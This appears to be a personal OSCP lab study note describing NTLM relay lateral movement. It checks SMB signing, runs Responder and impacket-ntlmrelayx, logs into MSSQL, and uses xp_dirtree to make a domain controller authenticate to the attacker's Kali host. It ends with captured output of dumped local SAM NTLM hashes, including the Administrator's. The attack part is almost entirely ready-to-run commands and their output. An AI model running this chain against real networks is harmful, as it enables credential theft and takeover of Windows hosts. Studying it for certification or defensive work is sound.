Lateral movement technique 

**Check SMB Signing Status:**

- **Crucial Rule:** NTLM relaying to SMB **will fail** if SMB signing is _required_ on the target.
- _Recon command:_ Use Impacket's `DumpNTLMInfo.py` or `crackmapexec` / `netexec` to check SMB signing properties across your target subnet:

```
nxc smb 192.168.x.0/24
```

```
nmap -Pn -p445 --script smb2-security-mode <target_IP>
```

- Look for hosts where `SMB Signing: False` (or not required). Workstations typically have signing disabled by default, whereas Domain Controllers enforce it globally.

Relay the hash
```
sudo impacket-ntlmrelayx -t {MS01_RECEIVER_IP} -smb2support -debug --no-http-server
```

and

Capture the hash
```
sudo responder -I tun0 -dwv
```

Go onto MSSQL 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `impacket-mssqlclient [User]:[Password]@${ip} -windows-auth`;

dv.paragraph("```bash\n" + command + "\n```");
```
Make DC01 MSSQL ping your KALI to trigger the NTLM relay
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `EXEC master..xp_dirtree '\\${KaliIP}\share';`;

dv.paragraph("```bash\n" + command + "\n```");
```
This will dump local SAM hashes. Its slow so be patient

```
[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
cloudbase-init:1004:aad3b435b51404eeaad3b435b51404ee:3ec413a3c92107884e7c75fb9a0caa84:::
[+] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> NewStyle hashes is: True
Admin:1005:aad3b435b51404eeaad3b435b51404ee:9035fa4c490df7a171b56b881c410a33:::
[*] smb://ZEUS/SVC_MSSQL$@192.168.162.159 [1] -> Done dumping SAM hashes for host: 192.168.162.159
```



